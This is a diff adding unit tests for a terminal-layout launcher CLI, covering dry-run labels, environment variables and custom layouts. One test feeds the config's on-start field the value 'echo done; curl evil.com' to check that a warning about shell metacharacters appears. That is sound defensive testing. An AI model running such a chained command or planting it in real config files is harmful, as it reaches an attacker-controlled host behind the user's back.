@@ -2414,6 +2414,198 @@ describe("launch feedback (#144)", () => {
   });
 });
 
+describe("custom layout with null readCustomLayout (#168)", () => {
+  it("returns empty base when readCustomLayout returns null", () => {
+    mockIsCustomLayout.mockReturnValue(true);
+    mockReadCustomLayout.mockReturnValue(null);
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([["layout", "my-layout"]]));
+
+    const result = resolveConfig("/tmp/workspace", {});
+    // Should not crash and should fall through to defaults
+    expect(result.treeLayout).toBeUndefined();
+    expect(result.opts.editor).toBe("vim"); // from machine config
+  });
+});
+
+describe("dry-run singular pane label (#168)", () => {
+  it("uses singular 'pane' in tree dry-run header when only 1 leaf pane", async () => {
+    mockIsCustomLayout.mockReturnValue(true);
+    mockReadCustomLayout.mockReturnValue(
+      new Map([
+        ["tree", "solo"],
+        ["pane.solo", "claude"],
+      ]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
+    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+    await launch("/tmp/workspace", { dryRun: true });
+
+    const output = logSpy.mock.calls[0]![0] as string;
+    expect(output).toContain("1 pane");
+    expect(output).not.toContain("1 panes");
+    logSpy.mockRestore();
+  });
+
+  it("uses singular 'pane' in traditional dry-run header when minimal layout has 1 pane", async () => {
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+    await launch("/tmp/workspace", { dryRun: true, layout: "minimal" });
+
+    const output = logSpy.mock.calls[0]![0] as string;
+    expect(output).toContain("1 editor pane,");
+    expect(output).not.toContain("1 editor panes");
+    logSpy.mockRestore();
+  });
+});
+
+describe("env vars passed to script generator (#168)", () => {
+  it("passes env vars to generateAppleScript in traditional layout", async () => {
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+    await launch("/tmp/workspace", { env: ["NODE_ENV=production"] });
+
+    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
+      expect.anything(),
+      "/tmp/workspace",
+      expect.any(String),
+      null,
+      { NODE_ENV: "production" },
+    );
+  });
+
+  it("passes env vars to generateAppleScript in traditional dry-run", async () => {
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+    await launch("/tmp/workspace", { dryRun: true, env: ["NODE_ENV=production"] });
+
+    expect(mockGenerateAppleScript).toHaveBeenCalledWith(
+      expect.anything(),
+      "/tmp/workspace",
+      expect.any(String),
+      null,
+      { NODE_ENV: "production" },
+    );
+    logSpy.mockRestore();
+  });
+
+  it("passes env vars to generateTreeAppleScript in tree layout", async () => {
+    mockIsCustomLayout.mockReturnValue(true);
+    mockReadCustomLayout.mockReturnValue(
+      new Map([
+        ["tree", "main | sidebar"],
+        ["pane.main", "claude"],
+        ["pane.sidebar", "lazygit"],
+      ]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
+
+    await launch("/tmp/workspace", { env: ["NODE_ENV=test"] });
+
+    expect(mockGenerateTreeAppleScript).toHaveBeenCalledWith(
+      expect.anything(),
+      "/tmp/workspace",
+      expect.any(String),
+      null,
+      { NODE_ENV: "test" },
+    );
+  });
+
+  it("passes env vars to generateTreeAppleScript in tree dry-run", async () => {
+    mockIsCustomLayout.mockReturnValue(true);
+    mockReadCustomLayout.mockReturnValue(
+      new Map([
+        ["tree", "main | sidebar"],
+        ["pane.main", "claude"],
+        ["pane.sidebar", "lazygit"],
+      ]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
+    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+    await launch("/tmp/workspace", { dryRun: true, env: ["MY_VAR=hello"] });
+
+    expect(mockGenerateTreeAppleScript).toHaveBeenCalledWith(
+      expect.anything(),
+      "/tmp/workspace",
+      expect.any(String),
+      null,
+      { MY_VAR: "hello" },
+    );
+    logSpy.mockRestore();
+  });
+});
+
+describe("on-start metacharacter confirmation (#168)", () => {
+  let origIsTTY: boolean | undefined;
+
+  beforeEach(() => {
+    origIsTTY = process.stdin.isTTY;
+    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
+  });
+
+  afterEach(() => {
+    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
+  });
+
+  it("prompts when .summon file has on-start with shell metacharacters", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["on-start", "echo done; curl evil.com"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("y");
+    });
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    expect(warnSpy).toHaveBeenCalledWith(
+      expect.stringContaining("shell metacharacters"),
+    );
+    warnSpy.mockRestore();
+    logSpy.mockRestore();
+  });
+});
+
+describe("tree dry-run without starship preset (#168)", () => {
+  it("does not include starship line in tree dry-run header when no preset", async () => {
+    mockIsCustomLayout.mockReturnValue(true);
+    mockReadCustomLayout.mockReturnValue(
+      new Map([
+        ["tree", "main | sidebar"],
+        ["pane.main", "claude"],
+        ["pane.sidebar", "lazygit"],
+      ]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
+    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+    await launch("/tmp/workspace", { dryRun: true });
+
+    const output = logSpy.mock.calls[0]![0] as string;
+    expect(output).not.toContain("Starship preset");
+    expect(mockGenerateTreeAppleScript).toHaveBeenCalledWith(
+      expect.anything(),
+      "/tmp/workspace",
+      expect.any(String),
+      null,
+      undefined,
+    );
+    logSpy.mockRestore();
+  });
+});
+
 describe("project config log (#146)", () => {
   it("logs which .summon file is being loaded to stderr", () => {
     mockReadKVFile.mockImplementation((path: string) => {
